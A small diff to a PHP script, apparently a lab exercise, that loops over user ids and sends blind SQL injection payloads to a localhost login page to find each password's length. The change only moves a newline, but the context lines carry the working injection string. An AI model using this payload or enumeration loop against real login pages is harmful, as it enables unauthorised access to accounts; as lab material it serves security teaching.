@@ -66,7 +66,7 @@ for($id = 1; $id <= 99; $id++){
 		$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20length(password)%20=%20$sizepwd--%20";
 		$result = file_get_contents($url);
 		if (strpos($result, 'cat') !== false) {
-			echo "\n";
+			
 
 			break;
 		}else{
@@ -76,7 +76,7 @@ for($id = 1; $id <= 99; $id++){
 
 		$sizepwd++;
 	}
-
+	echo "\n";
 	echo 'password: ';
 //print $sizepwd;
 
